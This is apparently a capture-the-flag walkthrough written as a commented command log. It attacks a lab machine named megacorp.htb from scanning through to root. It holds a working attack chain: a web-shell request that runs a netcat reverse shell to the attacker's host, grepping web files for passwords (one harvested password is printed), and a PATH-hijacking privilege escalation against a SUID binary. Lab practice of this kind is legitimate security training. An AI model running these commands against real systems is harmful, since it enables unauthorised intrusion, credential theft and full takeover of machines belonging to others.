# Security Audit Report
# ==============================================================================
# CONDENSED PENETRATION TESTING & PRIVILEGE ESCALATION WORKFLOW
# Target IP: 10.129.229.176
# ==============================================================================


# ==============================================================================
# --- Phase 1: Reconnaissance & Scanning ---
# ==============================================================================
ping -c 3 10.129.229.176
    # Why: Verifies that the target host is online and reachable.

nmap -p- -n -Pn -sS --min-rate 5000 -vvv 10.129.229.176 -oG allPorts
    # Why: Scans all 65535 TCP ports rapidly to identify open ports.

nmap -p22,80 -sCV 10.129.229.176 -oN targeted
    # Why: Performs service version detection and default script scanning on open ports.


# ==============================================================================
# --- Phase 2: Web Enumeration & Configuration ---
# ==============================================================================
addhost 10.129.229.176 megacorp.htb
    # Why: Maps the target IP to a domain name in the local hosts file for virtual-host handling.

cat /etc/hosts
    # Why: Verifies the domain name mapping was correctly written.

gobuster dir -u http://10.129.229.176/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 150
    # Why: Brute-forces hidden directories and files on the web server.


# ==============================================================================
# --- Phase 2.5: Initial Access (www-data) & Credential Harvesting ---
# ==============================================================================
nc -lvnp 9001
    # Why: Starts a netcat listener on the attacker machine to catch the incoming reverse shell.

curl http://10.129.229.176/uploads/shell.php?cmd=busybox%20nc%2010.10.15.5%209001%20-e%20/bin/bash
    # Why: Triggers a simple PHP web shell (shell.php) via HTTP request to execute a netcat reverse shell back to the attacker IP.

script /dev/null -c bash
    # Why: Upgrades the raw reverse shell into a proper interactive bash environment.
    # Note: Press Ctrl+Z to background the listener, run 'stty raw -echo; fg', then 'reset xterm', 'export TERM=xterm', and 'export SHELL=bash' to stabilize the TTY.

cd /var/www/html/cdn-cgi/login/ && cat * | grep -i passw*
    # Why: Searches configuration files and source code on the web server to harvest user credentials (revealing the password for user robert: MEGACORP_4dm1n!!).


# ==============================================================================
# --- Phase 3: Initial Access & User Flag ---
# ==============================================================================
ssh robert@10.129.229.176
    # Why: Logs into the target machine via SSH using the harvested credentials for user robert.

cat user.txt
    # Why: Retrieves the user flag from the home directory.


# ==============================================================================
# --- Phase 4: Privilege Escalation Enumeration ---
# ==============================================================================
id
    # Why: Checks current user ID and group memberships (discovers membership in the 'bugtracker' group).

find / -group bugtracker 2>/dev/null
    # Why: Locates files associated with the bugtracker group, revealing /usr/bin/bugtracker.

ls -la /usr/bin/bugtracker
    # Why: Confirms the binary has the SUID bit set, runs as root, and is accessible to the bugtracker group.


# ==============================================================================
# --- Phase 5: Exploitation & Root Flag via PATH Hijacking ---
# ==============================================================================
cd /tmp
    # Why: Navigates to a writable directory (/tmp) where we have permissions to create files.

nano cat
    # Why: Creates a custom script named 'cat' to exploit relative path execution inside the SUID binary. 
    # The SUID binary internally calls the system command 'cat' to read reports without specifying an absolute path (e.g., /bin/cat). 
    # By creating our own executable file named 'cat', we intercept that command call.
    # Script Contents:
    # /bin/sh

chmod +x cat
    # Why: Makes our custom 'cat' script executable so the system can run it as a program.

export PATH=/tmp/:$PATH
    # Why: Prepends the /tmp directory to the system's PATH variable. When the SUID root binary runs and calls 'cat', 
    # the shell looks in /tmp first, finds our malicious script, and executes it with root privileges instead of the real system utility.

/usr/bin/bugtracker 2
    # Why: Executes the SUID binary with an input ID. This triggers the internal call to 'cat', which now executes our 
    # malicious script and spawns an interactive root shell (#).

whoami
    # verify the new shell id
    # remain remove the /tmp from path to use 'cat' or insteade use 'nano'

cd /root && cat root.txt
    # Why: Navigates to the root directory and displays the root flag.
